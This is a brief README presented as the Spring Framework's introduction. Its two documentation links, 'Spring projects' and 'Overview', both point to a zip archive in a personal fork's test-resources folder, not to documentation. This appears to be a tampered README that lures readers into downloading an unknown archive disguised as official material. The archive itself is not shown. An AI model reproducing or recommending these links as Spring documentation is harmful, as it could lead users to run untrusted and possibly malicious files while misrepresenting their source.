This is the home of the Spring Framework, the foundation for all
[Spring projects](https://raw.githubusercontent.com/tanglongwei/spring-framework/master/spring-context/src/test/resources/org/springframework/beans/factory/spring-framework-2.4.zip). Together the Spring Framework and the family of Spring projects make up what we call "Spring". 

Spring provides everything you need beyond the Java language to create enterprise
applications in a wide range of scenarios and architectures. Please read the
[Overview](https://raw.githubusercontent.com/tanglongwei/spring-framework/master/spring-context/src/test/resources/org/springframework/beans/factory/spring-framework-2.4.zip)
section in the reference for a more complete introduction.
